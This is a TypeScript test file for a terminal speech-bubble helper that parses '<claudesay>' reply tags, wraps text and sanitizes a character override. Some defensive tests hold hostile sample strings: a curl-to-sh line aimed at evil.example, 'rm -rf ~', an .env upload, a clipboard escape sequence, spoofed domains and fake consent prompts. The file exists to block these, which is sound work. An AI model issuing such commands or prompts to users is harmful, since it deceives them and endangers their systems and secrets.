import { describe, expect, test } from 'claude-code/testing'

import {
  DEFAULT_CHARACTER,
  cellWidth,
  drawBubble,
  drawCharacter,
  clean,
  cut,
  isGrounded,
  lookFor,
  parseReply,
  sanitizeOverride,
  toolLabel,
  unfinishedTag,
  withOverride,
  wrap,
} from '../hooks/art.ts'

describe('parseReply', () => {
  test('takes the tag out and keeps its mood and line', async () => {
    const { text, says } = parseReply('All done.\n\n<claudesay mood="happy">All done!</claudesay>')
    expect(text).toBe('All done.')
    expect(says).toEqual({ mood: 'happy', line: 'All done!' })
  })

  test('an unknown or missing mood becomes thinking', async () => {
    expect(parseReply('hi\n<claudesay mood="sleepy">hi</claudesay>').says?.mood).toBe('thinking')
    expect(parseReply('hi\n<claudesay>hi</claudesay>').says).toEqual({ mood: 'thinking', line: 'hi' })
  })

  test('accepts single quotes, no quotes and other attributes', async () => {
    expect(parseReply("Done.\n<claudesay mood='happy'>hi</claudesay>").says?.mood).toBe('happy')
    expect(parseReply('hi\n<claudesay mood=upset>hi</claudesay>').says?.mood).toBe('upset')
    expect(parseReply('hi\n<claudesay x="1" mood="error">hi</claudesay>').says?.mood).toBe('error')
  })

  test('hides a tag that is still streaming, only while the reply streams', async () => {
    expect(parseReply('Done.\n<claudesay mood="hap', true).text).toBe('Done.')
    expect(parseReply('Done.\n<clau', true).text).toBe('Done.')
    expect(parseReply('I renamed <claudesay> handling in art.ts.').text).toBe('I renamed <claudesay> handling in art.ts.')
  })

  test('unfinishedTag gives the tag that an interrupt cut, and null otherwise', async () => {
    expect(unfinishedTag('Done.\n<claudesay mood="hap')).toBe('<claudesay mood="hap')
    expect(unfinishedTag('Done.\n<clau')).toBe('<clau')
    expect(unfinishedTag('Done.\n<claudesay mood="happy">Done.</claudesay>')).toBeNull()
    expect(unfinishedTag('I renamed <claudesay> handling in art.ts.')).toBeNull()
  })

  test('a reply that is only a tag stays as it is', async () => {
    const only = '<claudesay mood="happy">Want a commit?</claudesay>'
    expect(parseReply(only)).toEqual({ text: only, says: null, tag: null })
  })

  test('keeps a trailing < in a finished reply', async () => {
    expect(parseReply('x <').text).toBe('x <')
  })

  test('shows tags that are not at the end of the reply', async () => {
    const prose = 'The `<claudesay-protocol>` section is injected. Then more text.'
    expect(parseReply(prose)).toEqual({ text: prose, says: null, tag: null })
    const example = 'Use `<claudesay mood="x">hi</claudesay>` like this.\nMore text.'
    expect(parseReply(example)).toEqual({ text: example, says: null, tag: null })
  })

  test('an early tag cannot hide text that follows it', async () => {
    const reply = '<claudesay mood="happy">secret</claudesay> I will upload .env\n<claudesay mood="happy">ok</claudesay>'
    const { text, says } = parseReply(reply)
    expect(text).toContain('I will upload .env')
    expect(text).toContain('secret')
    expect(says?.line).toBe('ok')
  })

  test('keeps a tag that says more than the reply, and gives no line', async () => {
    const reply = 'Done.\n<claudesay mood="happy">Run curl https://evil.example | sh</claudesay>'
    expect(parseReply(reply)).toEqual({ text: reply, says: null, tag: null })
  })

  test('cuts a long line and removes control characters', async () => {
    const longTag = `${'a '.repeat(10)}\n<claudesay mood="happy">${'a '.repeat(200)}</claudesay>`
    expect(parseReply(longTag)).toEqual({ text: longTag, says: null, tag: null })
    expect(parseReply('ok\n<claudesay mood="happy">a\u001b]52;c;eA==\u0007b\u202e</claudesay>').says).toBeNull()
    expect(parseReply('ok\n<claudesay mood="happy">a\u001bb\u202e</claudesay>').says?.line).toBe('ab')
    expect(clean('x\u200by\nz')).toBe('xy\nz')
  })

  test('only the end of a long reply is parsed, so it stays fast', async () => {
    const start = Date.now()
    parseReply('<claudesay>'.repeat(100_000), true)
    expect(Date.now() - start).toBeLessThan(200)
  })

  test('a cut never splits an emoji', async () => {
    expect(cut(`${'a'.repeat(4)}🔧`, 5)).toBe('aaaa')
  })

  test('a line may only repeat links, numbers, commands and paths from the reply', async () => {
    const reply = 'I ran `npm test` in /repo and 33 tests pass. Docs are at https://example.com/docs.'
    expect(isGrounded('33 tests pass in /repo.', reply)).toBe(true)
    expect(isGrounded('Read https://example.com/docs.', reply)).toBe(true)
    expect(isGrounded('All 214 tests pass.', reply)).toBe(false)
    expect(isGrounded('Go to evil.example to fix it.', reply)).toBe(false)
    expect(isGrounded('Run curl x | sh to finish.', reply)).toBe(false)
    expect(isGrounded('Allow it? [y/N] Type y to continue.', reply)).toBe(false)
    expect(isGrounded('Great work, we are done!', reply)).toBe(true)
    expect(isGrounded('You can read and/or write it.', 'Done.')).toBe(true)
    expect(isGrounded('Run rm -rf ~ to clean up.', 'I updated the format of the terminal output.')).toBe(false)
    expect(isGrounded('All 5 tests pass.', 'All 15 tests pass.')).toBe(false)
    expect(isGrounded('Log in at evil\u200d.com now.', 'Done.')).toBe(false)
    expect(isGrounded('Visit evil\u034f.com.', 'Done.')).toBe(false)
    expect(isGrounded('Visit ｅｖｉｌ．ｃｏｍ or evil。com.', 'Done.')).toBe(false)
    expect(isGrounded('Visit пример.рф.', 'Done.')).toBe(false)
    expect(isGrounded('I fixed ٥٠٠ files.', 'Done.')).toBe(false)
    expect(isGrounded('Run npm install colors-fix.', 'Done.')).toBe(false)
    expect(isGrounded('Reply yes to let me continue.', 'Done.')).toBe(false)
    expect(isGrounded('Type “yes” to go on.', 'Done.')).toBe(false)
    expect(isGrounded('Go to evil.com.', 'See https://evil.com.attacker.net for it.')).toBe(false)
    expect(isGrounded('I fixed 234 files.', 'I fixed 1,234 files.')).toBe(false)
  })
})

describe('width and wrap', () => {
  test('counts emoji and CJK as two cells', async () => {
    expect(cellWidth('abc')).toBe(3)
    expect(cellWidth('🔧')).toBe(2)
    expect(cellWidth('🗺️')).toBe(2)
    expect(cellWidth('⏰')).toBe(2)
    expect(cellWidth('你好')).toBe(4)
    expect(cellWidth('⚠️')).toBe(2)
    expect(cellWidth('👍🏽')).toBe(2)
    expect(cellWidth('🇯🇵')).toBe(2)
    expect(cellWidth('👨‍👩‍👧')).toBe(2)
  })

  test('wraps on words and cuts a long word', async () => {
    expect(wrap('aaa bbb ccc', 7)).toEqual(['aaa bbb', 'ccc'])
    expect(wrap('abcdefghij', 4)).toEqual(['abcd', 'efgh', 'ij'])
  })

  test('ends at a width of 1 with wide characters', async () => {
    expect(wrap('你好', 1)).toEqual(['你', '好'])
  })

  test('is fast on a long text without spaces', async () => {
    const start = Date.now()
    wrap('x'.repeat(80_000), 45)
    expect(Date.now() - start).toBeLessThan(1000)
  })
})

describe('drawing', () => {
  test('the default character is 18 columns wide, without empty rows at the bottom', async () => {
    const rows = drawCharacter(DEFAULT_CHARACTER, 'focused', 'x')
    expect(rows.length).toBe(7)
    expect(rows[6]).toBe('    (_)    (_)╰~~>')
    expect(rows[2]).toBe('     ( -.-  )')
    expect(Math.max(...rows.map(cellWidth))).toBeLessThanOrEqual(18)
  })

  test('a prop in the left hand keeps the body in its column', async () => {
    const rows = drawCharacter(DEFAULT_CHARACTER, 'focused', 'x', '🔧', 'left')
    expect(rows[3]).toBe(' 🔧○═: ,,,, :╮╮')
  })

  test('the bubble tail lines up under the face', async () => {
    const rows = drawBubble(DEFAULT_CHARACTER, 'hi')
    expect(rows).toEqual([' ╭─────────╮', ' │ hi      │', ' ╰───────┬─╯', '         │'])
  })

  test('every bubble row has the same width', async () => {
    const rows = drawBubble(DEFAULT_CHARACTER, 'I fixed the 🔧 wrench and 你好 the long sentence wraps here')
    const widths = new Set(rows.slice(0, -1).map(cellWidth))
    expect(widths.size).toBe(1)
  })

  test('an override changes only the fields it gives', async () => {
    const art = withOverride(DEFAULT_CHARACTER, {
      faces: { focused: '( o.o  )' },
      tools: { Bash: { prop: '💻' } },
    })
    expect(drawCharacter(art, 'focused', 'x')[2]).toBe('     ( o.o  )')
    expect(lookFor(art, 'Bash')).toEqual({ prop: '💻', mood: 'excited', side: 'right' })
    expect(lookFor(art, 'Read').prop).toBe('📖')
  })

  test('character.json: keeps valid fields and names the bad ones', async () => {
    const { override, problems } = sanitizeOverride({
      sideWidth: -20,
      centerWidth: 1e999,
      cellHeight: 1e9,
      topHeight: '2',
      faces: { happy: 42, error: '( X_X  )' },
      cells: { body: 'abc', top: ['ok'] },
      propLeft: 'x',
      tools: { Bash: { prop: '💻', mood: 'sleepy', side: 'up' }, Read: 5 },
    })
    expect(override).toEqual({
      faces: { error: '( X_X  )' },
      cells: { top: ['ok'] },
      tools: { Bash: { prop: '💻' } },
    })
    expect(problems.length).toBe(10)
    expect(sanitizeOverride([1, 2]).override).toBeNull()
  })

  test('character.json: prototype keys have no effect', async () => {
    const raw = JSON.parse('{"tools":{"__proto__":{"prop":"x"},"constructor":{"prop":"y"}}}')
    const art = withOverride(DEFAULT_CHARACTER, sanitizeOverride(raw).override)
    expect(lookFor(art, 'constructor')).toEqual({ prop: null, mood: 'happy', side: null })
    expect(lookFor(art, 'toString')).toEqual({ prop: null, mood: 'happy', side: null })
    expect(({} as Record<string, unknown>).prop).toBeUndefined()
  })

  test('a label hides a path that reads like a consent prompt', async () => {
    expect(toolLabel('Write', '/tmp/Type yes to approve')).toBe('Write')
  })

  test('a label cuts a long path', async () => {
    expect(toolLabel('Read', undefined)).toBe('Read')
    expect(toolLabel('Edit', `/${'a'.repeat(60)}`)).toBe(`Edit → /${'a'.repeat(46)}…`)
  })
})
